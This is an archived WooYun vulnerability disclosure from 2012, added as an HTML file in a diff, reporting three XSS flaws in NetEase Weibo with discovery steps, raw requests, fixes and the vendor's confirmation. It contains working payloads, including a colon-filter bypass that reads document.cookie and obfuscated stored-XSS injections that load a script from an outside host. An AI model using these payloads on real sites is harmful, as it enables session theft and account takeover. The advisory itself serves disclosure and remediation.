@@ -1,0 +1,432 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		网易微博XSS礼包: 内容存储型(看了就中)+主页存储型+子页面XSS  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		网易微博XSS礼包: 内容存储型(看了就中)+主页存储型+子页面XSS  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2012-06-01 08:41</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-06-01：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-06-04：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-06-14：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-06-24：	细节向普通白帽子公开<br/>
+									2012-07-04：	细节向实习白帽子公开<br/>
+									2012-07-16：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">目前几个有微博的网站，都快转遍了，网易还没检测。今天晚上就跑来对网易微博做了一次检测。发现3处XSS。<br />
+<br />
+1. 内容存储型XSS，危害不解释，看到微博即中招。通杀所有浏览器<br />
+2. 微博主页存储型XSS，IE 6,7，8+兼容模式 有效<br />
+3. 微博子页面XSS。<br />
+<br />
+具体见详细说明。<br />
+<br />
+BTW,  求礼物...求礼物 ....   </p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">这里顺便分享下检测方式。<br />
+<br />
+<br />
+<br />
+从小漏洞到大漏洞依次说。<br />
+<br />
+<br />
+<br />
+----------------------------------------------------------<br />
+<br />
+<br />
+<br />
+1. 子页面XSS。<br />
+<br />
+<br />
+<br />
+习惯性的看一下网页的源码。 发现以下这么一段。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;script type=&quot;text/javascript&quot;&gt;<br />
+(function() {<br />
+   var url = location.toString();<br />
+   var index = url.indexOf(&#039;#!&#039;);<br />
+   if (index != -1) {<br />
+      location.replace(url.substr(index + 2).replace(/\:/g, &#039;&#039;));<br />
+   }<br />
+})();<br />
+&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+那么我们可以构造一个URL来执行我们的命令。<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://t.163.com/tbox#!javascript:alert(document.cookie);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+可是从代码里，我们可以看出，网易将 冒号:给过滤了<br />
+<br />
+<br />
+<br />
+不过在IE下（测试时为win7+ IE9），我们可以通过以下方式绕过。<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://t.163.com/tbox#!javascript&amp;#x3A;alert(document.cookie);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+效果证明：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/0100241772c556025dda530dc2b1687128ee1f77.jpg" target="_blank"><img src="../images/0100241772c556025dda530dc2b1687128ee1f77.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+----------------------------------------------------------<br />
+<br />
+<br />
+<br />
+2. 漏洞2，个人主页存储型XSS， 由于是在css里，用expression，对IE6，7及IE8以上兼容模式有效。<br />
+<br />
+<br />
+<br />
+这个漏洞比较低级，我就不详细说了。<br />
+<br />
+<br />
+<br />
+缺陷位置：微博换肤功能。<br />
+<br />
+缺陷URL： http://t.163.com/user.do?action=updateUserConfig<br />
+<br />
+缺陷参数：(4个)<br />
+<br />
+	profile_background_image_url<br />
+<br />
+	profile_background_pos<br />
+<br />
+	profile_background_fixed<br />
+<br />
+	profile_background_filled<br />
+<br />
+缺陷原因：没有过滤(,),; ，导致可以对css进行闭合。<br />
+<br />
+<br />
+<br />
+利用步骤：<br />
+<br />
+<br />
+<br />
+POST http://t.163.com/user.do?action=updateUserConfig<br />
+<br />
+POSTDATA<br />
+<br />
+</p><pre><code>profile_background_image_url=);color:expression(if(!window.x){window.x=1;var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.type=String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116);s.src=String.fromCharCode(104,116,116,112,58,47,47,120,115,115,116,46,115,105,110,97,97,112,112,46,99,111,109,47,109,46,106,115);document.body.appendChild(s);});a:(</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+以上代码是调用外部JS了，这里我就不给截图证明了，安全人员肯定知道的。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+----------------------------------------------------------<br />
+<br />
+<br />
+<br />
+3. 微博内容存储型XSS，这个危害是显而易见的。 <br />
+<br />
+<br />
+<br />
+分享一下发现方法：<br />
+<br />
+<br />
+<br />
+A. 首先，我个人比较喜欢测试多媒体功能，就试用了一下微博的音乐发送功能，发送的同时，也进行抓包。<br />
+<br />
+<br />
+<br />
+可以看到抓包有2个请求。<br />
+<br />
+<br />
+<br />
+</p><pre><code>请求一：将音乐地址生成短网址<br />
+<br />
+POST http://t.163.com/music.do?action=toShortUrl<br />
+POSTDATA<br />
+<br />
+url	http://www.xiami.com/song/1769227691</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><pre><code>请求二：推送微博内容<br />
+<br />
+POST http://t.163.com/tweet.do?action=addTweet<br />
+POSTDATA<br />
+<br />
+content	Somewhere Only We Know—Keane http://163.fm/QJ5yOnj<br />
+isRetweet	0<br />
+replyOriginal	0<br />
+replyIt	0<br />
+flag	0<br />
+imageUrl<br />
+voteUrl</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+B. 按照我一贯的思维方式，F12 打开 chrome 的调试工具，定位到刚发的那条微博上。<br />
+<br />
+<br />
+<br />
+发现以下有趣的内容。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/010029386b6c7e60f9b2c8c9734a7d49eb27dd27.jpg" target="_blank"><img src="../images/010029386b6c7e60f9b2c8c9734a7d49eb27dd27.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+C. 可以看出那个地址就是播放的歌曲地址，也就是步骤A中，被转换为短网址的那个地址。<br />
+<br />
+<br />
+<br />
+接着发挥俺的想象，推想一下。<br />
+<br />
+<br />
+<br />
+如果微博的开发人员，是反向将短网址的内容，输出到这里，而且没有任何过滤的话，岂不是爽了？<br />
+<br />
+<br />
+<br />
+如果真没过滤的话，我们可以构建以下代码进行XSS<br />
+<br />
+<br />
+<br />
+songurl=&quot;http://www.xiami.com/song/1769227691&quot;&gt;&lt;img src=1 onload=alert(1) /&gt;&lt;a <br />
+<br />
+<br />
+<br />
+D. 带着这个想法，我们通过以下步骤来进行XSS。<br />
+<br />
+<br />
+<br />
+E. 将含有恶意代码的网址转变为短网址<br />
+<br />
+<br />
+<br />
+</p><pre><code>POST http://t.163.com/music.do?action=toShortUrl<br />
+POSTDATA<br />
+<br />
+url=http://www.xiami.com/song/2068536?&quot;&#039;&gt;&lt;img src=1 onerror=&#039;var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.type=String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116);s.src=String.fromCharCode(104,116,116,112,58,47,47,120,115,115,116,46,115,105,110,97,97,112,112,46,99,111,109,47,109,46,106,115);document.body.appendChild(s);&#039;&gt;&lt;a<br />
+<br />
+返回数据得到短网址  http://163.fm/QJ5yOnj</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+F. 将构建的短网址放入内容进行发送<br />
+<br />
+<br />
+<br />
+</p><pre><code>POST http://t.163.com/tweet.do?action=addTweet<br />
+POSTDATA<br />
+<br />
+content	Somewhere Only We Know—Keane http://163.fm/QJ5yOnj<br />
+isRetweet	0<br />
+replyOriginal	0<br />
+replyIt	0<br />
+flag	0<br />
+imageUrl<br />
+voteUrl</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+G. 刷新我们的微博，会发现多了一条微博，并且弹出了cookies。 这证明了我们的猜想是对的～～ 为了进一步确定，我们可以再打开Chrome调试工具，看看<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/01003247d99f666970498b0b02103eb46f679130.jpg" target="_blank"><img src="../images/01003247d99f666970498b0b02103eb46f679130.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+效果证明：<br />
+<br />
+<br />
+<br />
+chrome下自己查看微博的弹窗：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/01002705e8646ef13bdc38fe70159de3df655ea0.jpg" target="_blank"><img src="../images/01002705e8646ef13bdc38fe70159de3df655ea0.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+IE下，用另外一个号关注了上面这个号之后，在自己的主页被上面的号发送的微博弹窗。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/0100281584837fcfcdbd9e5f0bb5df17a88e9d38.jpg" target="_blank"><img src="../images/0100281584837fcfcdbd9e5f0bb5df17a88e9d38.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+至于Firefox，我就不测试了，因为这段利用过程不存在浏览器兼容问题。<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">看详细说明～ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1. 对于子页面的那个XSS，除了过滤冒号之外，应该判断一下，#!以后的内容，加强判断。<br />
+<br />
+<br />
+<br />
+2. 对于个人主页的XSS， 多个最起码的正则判断吧，比如 profile_background_fixed 这个参数只有0和1，很好限制的。然后过滤 （）这种可能闭合css的字符。<br />
+<br />
+<br />
+<br />
+3. 至于第3个XSS，在从短网址读取真实歌曲地址的时候， encodeURIComponent 编码一下所得到的真实地址，再输出即可！ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-07762" title="网易微博XSS礼包: 内容存储型(看了就中)+主页存储型+子页面XSS">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2012-06-04 10:52</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢您对网易的关注，已经修复。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="7762";
+var bugRating="-3";
+var myRating="";
+var ratingCount="2";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
